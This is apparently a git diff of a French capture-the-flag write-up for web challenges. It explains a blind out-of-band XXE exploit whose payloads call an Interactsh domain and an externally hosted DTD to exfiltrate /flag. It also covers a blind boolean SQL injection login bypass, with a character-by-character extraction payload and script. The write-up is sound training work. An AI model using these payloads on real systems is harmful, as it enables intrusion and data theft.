@@ -33,8 +33,6 @@ Je trouve le flag et l'affiche:
 
 ![[IMG-20251202161952789.png]]
 
-FLAG CHALL 1:
-
 ```
 FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/j418w8w9cep09bc559jm427jare4aiz9-end.html}
 ```
@@ -285,9 +283,26 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof
 
 ## Chall 5
 
-![[IMG-20251205031810382.png]]
-https://app.interactsh.com/#/
+Ce challenge reprend une structure très similaire au **challenge numéro 4**, mais cette fois-ci l’exploitation est plus complexe et nécessite l’utilisation d’une technique d’exfiltration hors-bande (_Out-Of-Band_, ou **OAST**).
 
+Comme pour le 4ème challenge, on observe un formulaire qui envoie en arrière-plan une requête contenant un champ nommé `xml`, dont la valeur est tout simplement une chaîne **encodée en Base64** représentant un document XML.
+En réinjectant du XML contrôlé par l’utilisateur, il est possible d'ajouter une déclaration `<!DOCTYPE>` afin de définir des **entités externes**. 
+Cependant, contrairement à l’exercice précédent, **le serveur ne renvoie jamais le contenu résolu des entités dans la réponse HTTP**.  
+Ainsi, même en tentant d’inclure une ressource locale comme `file:///flag`, aucune donnée utile n’est affichée côté client.
+Cela signifie que nous sommes face à une **XXE Blind**, c’est-à-dire que l’on peut forcer le serveur à lire des fichiers, mais **on ne peut pas voir directement le contenu dans la réponse HTTP**.
+Je cherche donc des exploits associé à cette vulnérabilité et je trouve cette exploit sur le site de PortSwigger. 
+![[IMG-20251205031810382.png]]
+
+Pour exploiter cette vulnérabilité, on utilise une technique de **Blind XXE Out-Of-Band**, car le serveur ne renvoie jamais le contenu du fichier demandé.  
+Il accepte cependant de charger des **DTD externes**, ce qui permet d’exécuter du XML plus complexe.
+On commence par créer un fichier `.dtd` contenant la _vraie_ payload XXE : lecture du fichier `/flag` et exfiltration de son contenu vers un server qu'on contôle.
+On ne peut **pas** envoyer cette payload directement via le champ `xml` du formulaire car le parseur PHP interdit les paramètres internes contenant des `%`, ce qui provoquait immédiatement des erreurs (`PEReferences forbidden`, `entity not defined`, etc.).
+Ensuite j'envoie dans le champ XML une payload qui charge la DTD hébergée et exécute ce qu’elle contient. Ainsi, le fichier `/flag` est lu et envoyé notre server en arrière-plan grâce à la DTD.
+Pour recevoir le contenu exfiltré, j’aurais pu ouvrir un port sur ma box et configurer un port-forwarding vers un serveur local, mais cela demande une configuration réseau inutilement complexe.  
+Pour simplifier, j’ai utilisé **Interactsh**, un service conçu pour capturer des requêtes sans aucune configuration : il fournit un domaine unique et enregistre automatiquement toutes les connexions entrantes.  
+En plaçant ce domaine dans ma DTD malveillante, le serveur vulnérable envoie directement le contenu du fichier `/flag` vers Interactsh, ce qui me permet de le récupérer même en situation de Blind XXE.
+
+Avant d’exploiter la vulnérabilité, il fallait d’abord vérifier que le serveur hébergeant l’application pouvait effectuer des connexions sortantes. Pour cela, j’envoie une première payload XXE très simple, dont le seul objectif est de forcer le serveur à effectuer une requête vers mon domaine Interactsh :
 ```xml
 <!DOCTYPE xxe [
   <!ENTITY test SYSTEM "http://azxtrmtedzbcsenavtvoj2xgzxir184d7.oast.fun/">
@@ -295,12 +310,15 @@ https://app.interactsh.com/#/
 <doc>&test;</doc>
 ```
 
-![[IMG-20251205035312111.png]]
+On peut observer sur Interactsh qu'une connexion a bien été établie depuis le server, donc l'exploit expliqué avant peut être mise en place.
+![[IMG-20251206003812552.png]]
 
-https://paste.c-net.org/
+Je crée ensuite mon fichier DTD malveillant, contenant la véritable payload XXE, puis je décide de l’héberger sur le site _paste.c-net.org_.  
+Ce service permet d’héberger un fichier texte publiquement, accessible via une URL directe, sans restrictions particulières et sans nécessiter de configuration serveur. 
 
 ![[IMG-20251205033822725.png]]
 
+Je crée ensuite la payload XML qui va charger automatiquement la DTD hébergée à l’URL ci-dessus:
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
@@ -308,8 +326,13 @@ https://paste.c-net.org/
 <doc>&xxe;
 ```
 
+Une fois chargée, c’est **la DTD elle-même** qui effectue toute l’exfiltration du fichier `/flag`.
+J'encode ma payload en base64 et l'envoie dans le champ XML:
 ![[IMG-20251205034011844.png]]
 
+Une fois la DTD chargée, le serveur tente de construire l’URL d’exfiltration contenant directement le contenu du fichier `/flag`. Le problème est que le flag inclut des caractères spéciaux (`{`, `}`, `/`, etc.) qui rendent l’URL générée invalide aux yeux du parseur XML de PHP. Lorsqu’il essaie d’interpréter cette URI malformée, `simplexml_load_string()` déclenche une erreur et affiche l’URL fautive dans le message d’erreur. Comme cette URL contient le flag en clair dans ses paramètres, celui-ci apparaît directement dans la réponse HTTP.  
+Dans un scénario réel, ou pour obtenir une exfiltration propre dans Interactsh, il aurait fallu encoder le contenu récupéré (par exemple en Base64 via `php://filter/convert.base64-encode/resource=/flag`) afin d’éviter que les caractères spéciaux ne cassent la construction de l’URL. Cela permettrait de transmettre le flag silencieusement, sans générer d’erreur côté serveur.  
+Cependant, pour ce challenge, cette erreur nous a été utile : elle confirme que l’attaque XXE fonctionne, que la DTD externe est bien interprétée, et qu’elle permet effectivement de lire le fichier `/flag`. Le flag est donc récupéré malgré l’erreur, ce qui suffit à valider complètement l’exploitation.
 
 ```
 FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xvq9xm-end.html}
@@ -317,19 +340,61 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xv
 
 ## Chall 6
 
-![[IMG-20251205221651925.png]]
+L’interface du challenge propose uniquement une page de connexion.  
+Aucune fonctionnalité additionnelle (inscription, posts, dashboard…) n’est réellement opérationnelle côté serveur.  
+Le seul point d’entrée exploitable est l’API suivante :
 
-![[IMG-20251205231633285.png]]
-
-
-![[IMG-20251205221937938.png]]
-
-![[IMG-20251205221625977.png]]
-
-```sql
-' OR (SELECT substr(content,1,1) FROM post WHERE id=6)='t' -- 
+```
+POST /api/authenticate
 ```
 
+Cette API reçoit un couple _username/password_ au format JSON, et renvoie une réponse indiquant si l'utilisateur est authentifié ou non.
+
+Lors de tests initiaux, l’envoi d’un couple de valeurs arbitraires déclenche systématiquement le message :
+
+```
+{"error": true, "message": "Invalid credentials"}
+```
+
+Afin d’évaluer la robustesse du paramètre _username_, J'ai testé la requête suivante :
+![[IMG-20251205221651925.png]]
+
+Le serveur renvoie cette fois une authentification **réussie**, indiquant clairement que l’expression transmise dans `username` a interrompu la requête SQL -> SQLi. 
+Aucune erreur n’est remontée lorsque la requête injectée casse la structure SQL côté serveur. L’application ne fournit qu’une réponse binaire (“error”: true/false), ce qui indique clairement qu’il s’agit d’une **injection SQL en mode blind booléen**, où la seule information exploitable pour orienter les tests est l’état de réussite ou d’échec de l’authentification.
+
+Une fois connecté sur la dashboard j'aperçois ce message:
+![[IMG-20251205231633285.png]]
+Je comprends alors que le but de ce challenge va être de récupérer le contenu des articles pour trouver le flag en utilisant la SQLi blind.
+
+Dans un premier temps, l’objectif est de déterminer dans quelle table de la base de données sont stockés les différents articles.  
+Pour cela, une requête SQL injectée de type **UNION SELECT** est utilisée afin de tester l’existence d’une table suspectée.
+La payload suivante est envoyée dans le champ _username_ :
+![[IMG-20251205221937938.png]]
+
+La réponse obtenue confirme que la table **`post`** existe bien dans la base de données : en effet, la requête injectée ne génère aucune erreur et l’API retourne un message _« Logged in »_.
+
+Le fait que la commande **`UNION SELECT null,null`** fonctionne sans erreur indique également que la table `post` possède **exactement deux colonnes exploitables** dans la requête injectée.  
+Cela confirme à la fois :
+- l’existence de la table,
+- **et** le nombre de champs attendus lors de la construction du résultat SQL.
+
+L’objectif à présent est donc de déterminer **le nom  de ces colonnes**. Pour cela j'utilise cette payload:
+
+![[IMG-20251205221625977.png]]
+Le serveur renvoyant une réponse **“Logged in”** lorsque j’utilise les colonnes `id` et `content` dans l’injection SQL, je peux désormais construire une payload permettant d’extraire le contenu de chaque article de manière ciblée.
+Pour effectuer cette extraction, j’utilise une requête SQL booléenne basée sur la fonction `substr()` afin de tester le contenu **caractère par caractère** :
+
+```sql
+' OR (SELECT substr(content,1,1) FROM post WHERE id=<id-article>)='<caractere-testé>' -- 
+```
+
+- `substr(content,1,1)` : extrait le premier caractère du champ `content`.  J’incrémente ensuite la position pour parcourir l’intégralité du texte.
+- `FROM post WHERE id=<id>` : me permet de cibler l’article voulu.
+- `='<caractere>'` : compare le caractère extrait à celui que je teste.
+- Si la condition est vraie → la requête renvoie un résultat → le serveur répond **“Logged in”**.
+- Si elle est fausse → la requête ne renvoie rien → le serveur renvoie `"error": true`.
+
+Etant difficile et long de testé tous les caractères de chaque article à la main, je décide de créer un script pour le faire automatiquement:
 
 ```python
 import requests
@@ -361,9 +426,13 @@ while True:
     i += 1
 ```
 
+J’ai ensuite exécuté mon script sur chaque article en modifiant simplement l’ID ciblé.  
+Les premiers articles ne contenaient rien d’utile, mais lors de l’extraction du contenu de **l’article 5**, le script a révélé le message :
 ![[IMG-20251205232138373.png]]
-
+En laissant le script tourner, j’ai obtenu l’intégralité du flag:
 ```
 flag{http://home-2025-12-02-tdu3-b60612.wannatry.fr/3nwhe9e1bdq7lc7uqueo4kmcasizwvuw-end.html}   
 ```
+
+## Chall 7
 
